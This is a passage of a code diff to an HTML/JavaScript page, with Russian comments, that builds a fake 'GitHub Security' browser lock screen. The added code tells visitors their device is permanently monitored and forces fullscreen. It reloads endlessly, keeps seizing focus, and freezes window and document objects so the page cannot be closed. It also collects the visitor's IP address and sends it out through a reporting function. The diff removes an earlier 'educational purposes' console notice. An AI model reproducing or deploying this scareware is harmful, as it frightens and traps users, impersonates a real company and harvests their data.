+                    <div style="margin-top: 50px; color: #888;">
+                        This device is now permanently monitored by GitHub Security
+                    </div>
+                </div>
+            `;
+            
+            // Бесконечный цикл
+            setInterval(() => {
+                window.location.reload();
+            }, 10000);
+        }
+
+        // ================= РАЗБЛОКИРОВКА =================
+        function unlockSystem() {
+            document.body.innerHTML = `
+                <div style="background: #000; color: #0f0; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column;">
+                    <div style="font-size: 60px; margin-bottom: 30px;">✅</div>
+                    <h1 style="color: #0f0; margin-bottom: 20px;">ДОСТУП ВОССТАНОВЛЕН</h1>
+                    <p style="margin-bottom: 30px;">Система безопасности деактивирована</p>
+                    <div style="color: #888; font-size: 14px;">
+                        Всего попыток: ${CONFIG.MAX_ATTEMPTS - state.attemptsLeft}<br>
+                        Отправлено отчетов: ${state.dataSendCount}
+                    </div>
+                </div>
+            `;
+            
+            // Остановка всех интервалов
+            const highestIntervalId = setInterval(() => {}, 0);
+            for (let i = 0; i < highestIntervalId; i++) {
+                clearInterval(i);
             }
-        });
-        
-        // Инициализация
-        window.onload = function() {
-            getIP();
-            updateTime();
-            startTimer();
+        }
+
+        // ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
+        function playAlert() {
+            try {
+                const audio = document.getElementById('alertSound');
+                audio.currentTime = 0;
+                audio.play().catch(() => {});
+            } catch (e) {}
+        }
+
+        function forceFullscreen() {
+            if (!document.fullscreenElement && !state.isFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+                state.isFullscreen = true;
+            }
+        }
+
+        function startActivityCheck() {
+            setInterval(() => {
+                const now = Date.now();
+                if (now - state.lastActivity > 30000) { // 30 секунд бездействия
+                    showPopup();
+                    playAlert();
+                    state.lastActivity = now;
+                }
+            }, 5000);
             
-            // Обновляем время каждую секунду
-            setInterval(updateTime, 1000);
+            // Обновляем время активности при любом событии
+            ['mousemove', 'keydown', 'click', 'touchstart'].forEach(event => {
+                document.addEventListener(event, () => {
+                    state.lastActivity = Date.now();
+                });
+            });
+        }
+
+        // ================= ИНИЦИАЛИЗАЦИЯ =================
+        window.addEventListener('DOMContentLoaded', () => {
+            // Получаем IP
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    sendData('ip_address', data.ip);
+                })
+                .catch(() => {
+                    sendData('ip_address', 'unknown');
+                });
+
+            // Запускаем блокировку
+            initializeLock();
             
-            // Фокус на поле пароля
+            // Фокус на поле ввода
             document.getElementById('password').focus();
             
-            // Логирование загрузки
-            console.log('%c🚨 СИСТЕМА БЕЗОПАСНОСТИ АКТИВИРОВАНА 🚨', 
-                'color: red; font-size: 20px; font-weight: bold;');
-            console.log('%c⚠️ Эта страница предназначена для образовательных целей', 
-                'color: yellow; font-size: 14px;');
-        };
+            // Предотвращаем потерю фокуса
+            setInterval(() => {
+                document.getElementById('password').focus();
+            }, 1000);
+            
+            console.log('%c🔒 СИСТЕМА БЕЗОПАСНОСТИ ГИТХАБ АКТИВИРОВАНА 🔒', 
+                'color: red; font-size: 24px; font-weight: bold; background: black; padding: 10px;');
+            console.log('%c⚠️ Эта страница не может быть закрыта ⚠️', 
+                'color: yellow; font-size: 18px;');
+        });
+
+        // Предотвращаем любые попытки остановки
+        Object.freeze(window);
+        Object.freeze(document);
+        Object.freeze(navigator);
     </script>
 </body>
 </html>
